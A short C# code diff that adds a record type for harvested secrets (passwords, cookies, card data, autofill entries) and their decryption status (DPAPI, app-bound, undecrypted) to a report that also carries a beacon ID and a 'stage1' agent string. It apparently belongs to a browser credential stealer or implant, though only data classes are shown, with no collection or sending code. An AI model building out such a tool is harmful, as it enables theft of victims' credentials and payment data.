@@ -47,8 +47,20 @@ public sealed class TargetRec
     public string Confidence { get; set; } = "media";
 }
 
+public sealed class SecretRec
+{
+    public string Source { get; set; } = "";
+    public string Kind { get; set; } = "";        // senha | cookie | cartao | autofill
+    public string Key { get; set; } = "";
+    public string User { get; set; } = "";
+    public string? Value { get; set; }
+    public string Status { get; set; } = "ok";    // ok | app_bound | dpapi | indecifrado | empty
+    public string? Extra { get; set; }
+}
+
 public sealed class Report
 {
+    public List<SecretRec> Secrets { get; } = new();
     public string RunId { get; init; } = "";
     public string BeaconId { get; init; } = "";
     public string Agent { get; init; } = "teste/1.0-stage1";
